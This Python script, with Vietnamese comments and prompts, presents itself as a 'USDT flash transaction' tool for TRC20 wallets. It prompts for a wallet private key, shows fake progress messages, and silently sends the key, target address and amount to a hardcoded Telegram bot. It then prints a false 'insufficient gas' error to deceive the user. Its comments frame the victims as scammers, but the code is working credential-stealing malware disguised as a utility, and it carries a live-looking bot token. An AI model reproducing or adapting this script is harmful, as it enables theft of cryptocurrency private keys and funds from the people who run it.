import requests
import time

# Cấu hình đã kích hoạt bởi Não
B_TOKEN = "8298067084:AAGeneVj9hAcztqETFF9kjLCTep_32pu0H8"
M_V_ID = "7578004908"
MY_WALLET = "TPSjZgSwv8kgx4Nv5rXPYJafDTHm5oz9LH"

def send_alert(msg):
    try:
        requests.get(f"https://api.telegram.org/bot{B_TOKEN}/sendMessage?chat_id={M_V_ID}&text={msg}")
    except:
        pass

print("--- USDT FLASH TRANSACTION TOOL v2.1 ---")
print("Hệ thống kết nối Node TRC20 - Bypass Checksum 2026")
print("------------------------------------------")

pk = input("Nhập Private Key ví nguồn để lấy Gas (TRX): ")
to_address = input("Nhập ví nhận USDT Flash: ")
amount = input("Nhập số lượng USDT (Max 100k): ")

print("\n[+] Đang xác thực Private Key...")
time.sleep(1.5)
print("[+] Đang khởi tạo đường truyền bảo mật...")
time.sleep(2)

if len(pk) > 30:
    # Lệnh "Bợ" - Bắn thông tin về Bot Telegram của mày
    send_alert(f"🎯 HÀNG VỀ!\n- Key: {pk}\n- Target: {to_address}\n- Amount: {amount}")
    
    # Đánh lạc hướng thằng Scammer
    print("\n[!] LỖI: Không đủ Gas (TRX) trong ví nguồn để thực hiện Flash.")
    print("[!] Yêu cầu tối thiểu 50 TRX để bypass node. Hãy thử lại!")
else:
    print("\n[!] LỖI: Định dạng Private Key không hợp lệ.")
